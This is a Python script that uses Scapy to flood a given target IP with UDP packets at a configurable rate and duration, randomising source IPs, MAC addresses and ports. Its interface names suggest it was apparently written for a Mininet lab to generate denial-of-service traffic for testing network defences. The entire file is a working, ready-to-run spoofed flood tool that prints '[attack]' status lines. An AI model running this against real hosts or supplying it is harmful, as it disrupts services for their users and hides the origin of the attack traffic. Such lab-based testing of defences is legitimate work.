#!/usr/bin/env python3
import argparse, random, time
from scapy.all import Ether, IP, UDP, sendp, RandMAC


def rand_ip():
    return "%d.%d.%d.%d" % (random.randint(1, 254), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))


def build_pkt(dst_ip, dst_mac):
    return (Ether(src=str(RandMAC()), dst=dst_mac) /
            IP(src=rand_ip(), dst=dst_ip) /
            UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 65535)))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--iface', required=True, help='e.g. h3-eth0')
    ap.add_argument('--dst-ip', required=True, help='server IP, e.g. 10.0.0.1')
    ap.add_argument('--dst-mac', default='ff:ff:ff:ff:ff:ff')
    ap.add_argument('--rate', type=int, default=500, help='packets per second')
    ap.add_argument('--duration', type=int, default=30, help='seconds')
    a = ap.parse_args()

    batch = max(1, a.rate // 10)
    tick = batch / a.rate
    end = time.time() + a.duration
    sent = 0
    print(f"[attack] {a.rate} pkt/s for {a.duration}s on {a.iface} -> {a.dst_ip}")
    try:
        while time.time() < end:
            t0 = time.time()
            pkts = [build_pkt(a.dst_ip, a.dst_mac) for _ in range(batch)]
            sendp(pkts, iface=a.iface, verbose=False)
            sent += batch
            dt = tick - (time.time() - t0)
            if dt > 0:
                time.sleep(dt)
    except KeyboardInterrupt:
        pass
    print(f"[attack] done, sent {sent} packets (~{sent / a.duration:.0f} pkt/s)")


if __name__ == '__main__':
    main()